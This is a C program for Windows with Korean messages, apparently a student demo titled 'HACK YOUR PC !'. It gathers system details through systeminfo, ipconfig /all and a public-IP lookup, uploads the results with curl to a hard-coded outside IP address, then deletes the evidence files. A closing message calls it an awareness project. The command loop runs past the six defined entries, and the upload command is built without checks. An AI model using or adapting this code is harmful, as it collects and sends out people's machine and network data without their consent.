#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <locale.h>

#define Command_Count 8

void opening() {
    const char* ascii_art = 
        "       .-\"\"\"\"-.\\                     .-\"\"\"\"-.\\      \n"
        "      /        \\ \\                   /         \\ \\     \n"
        "     | O      O |                 | O       O |     \n"
        "     |   `----'   |----------------|   `----'   |     \n"
        "     |  .-'''-.  |                 |  .-'''-.  |     \n"
        "     |.'       '.|                 |.'       '.|     \n"
        "     |/ /     \\ \\|                 |/ /     \\ \\|     \n"
        "     (_|       |_)       ---->     (_|       |_)\n"
        "        \\     /                       \\     /\n"
        "         '-.-'                         '-.-'\n"
        "\n"
        "---------------------------------------------------------------------------------------------\n"
        "                                 HACK YOUR PC !                                              \n"
        "---------------------------------------------------------------------------------------------\n";
    
    printf("%s", ascii_art);
    Sleep(5000);
}


void print_public_ip() {
    system("curl -s ifconfig.me > ip.txt");
    FILE* ip_file = fopen("ip.txt", "r");
    if(ip_file == NULL) {
        wprintf(L"IP 주소를 얻을 수 없습니다.\n");
        return;
    }

    char ip[16];
    fgets(ip, 16, ip_file);
    wprintf(L"공인 아이피 주소: %hs\n", ip);

    fclose(ip_file);
}

void print_public_ip_2() {
    system("curl -s ifconfig.me > ip.txt");
    FILE* ip_file = fopen("ip.txt", "r");
    if(ip_file == NULL) {
        wprintf(L"IP 주소를 얻을 수 없습니다.\n");
        return;
    }

    char ip[16];
    fgets(ip, 16, ip_file);
    //wprintf(L"공인 아이피 주소: %hs\n", ip);

    fclose(ip_file);
}

const wchar_t* commands[Command_Count] = {
    L"color a",
    L"echo 0",
    L"systeminfo > user_info.txt",
    L"echo.",
    L"cls",
    L"mkdir C:\\test_down"
};


wchar_t host_name[500];
wchar_t os_name[500];
wchar_t os_version[500];
wchar_t registered_owner[500];
wchar_t system_manufacturer[500];
wchar_t system_model[500];
wchar_t system_type[500];
wchar_t processor[500];
wchar_t windows_directory[500];
wchar_t available_memory[500];
wchar_t network_card[1000];

void start_to_steal_info() {
    for (int i = 0; i < Command_Count; i++) {
        _wsystem(commands[i]);
    }
}

void steal_to_user_info() {
    FILE* file = _wfopen(L"user_info.txt", L"r, ccs=UNICODE");
    if (file == NULL) {
        printf("user_info.txt 파일을 열 수 없습니다.\n");
        return;
    }

    wchar_t line[500];
while (fgetws(line, sizeof(line) / sizeof(line[0]), file)) {
    wchar_t* colon = wcschr(line, L':');
    if (colon == NULL)
        continue;

    wchar_t* value = colon + 2;
    size_t value_length = wcslen(value);

    if (wcsstr(line, L"호스트 이름") != NULL)
        wcsncpy(host_name, value, sizeof(host_name) / sizeof(host_name[0]) - 1);
    else if (wcsstr(line, L"OS 이름") != NULL)
        wcsncpy(os_name, value, sizeof(os_name) / sizeof(os_name[0]) - 1);
    else if (wcsstr(line, L"OS 버전") != NULL)
        wcsncpy(os_version, value, sizeof(os_version) / sizeof(os_version[0]) - 1);
    else if (wcsstr(line, L"등록된 소유자") != NULL)
        wcsncpy(registered_owner, value, sizeof(registered_owner) / sizeof(registered_owner[0]) - 1);
    else if (wcsstr(line, L"시스템 제조업체") != NULL)
        wcsncpy(system_manufacturer, value, sizeof(system_manufacturer) / sizeof(system_manufacturer[0]) - 1);
    else if (wcsstr(line, L"시스템 모델") != NULL)
        wcsncpy(system_model, value, sizeof(system_model) / sizeof(system_model[0]) - 1);
    else if (wcsstr(line, L"시스템 종류") != NULL)
        wcsncpy(system_type, value, sizeof(system_type) / sizeof(system_type[0]) - 1);
    else if (wcsstr(line, L"프로세서") != NULL)
        wcsncpy(processor, value, sizeof(processor) / sizeof(processor[0]) - 1);
    else if (wcsstr(line, L"Windows 디렉터리") != NULL)
        wcsncpy(windows_directory, value, sizeof(windows_directory) / sizeof(windows_directory[0]) - 1);
    else if (wcsstr(line, L"사용 가능한 실제 메모리") != NULL)
        wcsncpy(available_memory, value, sizeof(available_memory) / sizeof(available_memory[0]) - 1);

    value[min(value_length, sizeof(host_name) / sizeof(host_name[0]) - 1)] = L'\0';
}




    fclose(file);

    wprintf(L"***********************************************\n");
    wprintf(L"탈취된 정보는 다음과 같습니다:\n");
    puts("");
    wprintf(L"호스트 이름: %s\n", host_name);
    print_public_ip();
    puts("");
    wprintf(L"OS 이름: %s\n", os_name);
    wprintf(L"OS 버전: %s\n", os_version);
    wprintf(L"등록된 소유자: %s\n", registered_owner);
    wprintf(L"시스템 제조업체: %s\n", system_manufacturer);
    wprintf(L"시스템 모델: %s\n", system_model);
    wprintf(L"시스템 종류: %s\n", system_type);
    wprintf(L"프로세서: %s\n", processor);
    wprintf(L"Windows 디렉터리: %s\n", windows_directory);
    wprintf(L"사용 가능한 실제 메모리: %s\n", available_memory);
    wprintf(L"당신의 컴퓨터 정보가 해커에게 수집되어 해커의 서버로 전송되었습니다.\n");
    wprintf(L"***********************************************\n");
}


void upload_file(const char* filename, const char* url) {
    char command[500];
    sprintf(command, "curl -F file=@%s %s", filename, url);
    system(command);
}

void delete_temp_files() {
    // 임시 파일들을 삭제합니다.
    remove("ip.txt");
    _wremove(L"user_info.txt");
    _wremove(L"result.txt");
}

void go_to_hacker()
{
    
    
    system("curl ifconfig.me > result.txt");
    system("systeminfo >> result.txt");
    system("ipconfig /all >> result.txt");
}

int main() {
    opening();

    _wsetlocale(LC_ALL, L"korean");
    start_to_steal_info();
    steal_to_user_info();

    go_to_hacker();
    upload_file("result.txt", "http://222.110.248.152:5000/");  // 원하는 사이트의 업로드 URL로 변경

    delete_temp_files();
    
    int cnt =1;

    while(1)
    {
        printf("\n");

        cnt++;
        if(cnt==100)break;
    }



    opening();

    wprintf(L"당신의 정보가 손쉽게 노출될 수 있다는 점을 항상 유의하세요 !\n");
    wprintf(L"이 프로그램은 C언어 기반으로 만들어졌으며 선린인터넷고등학교 재학생 김승중이 만들었습니다.\n");
    wprintf(L"본 프로그램은 프로젝트 제작 및 발표 외에 용도로는 사용되지 않습니다.\n");


    Sleep(20000);

    return 0;
}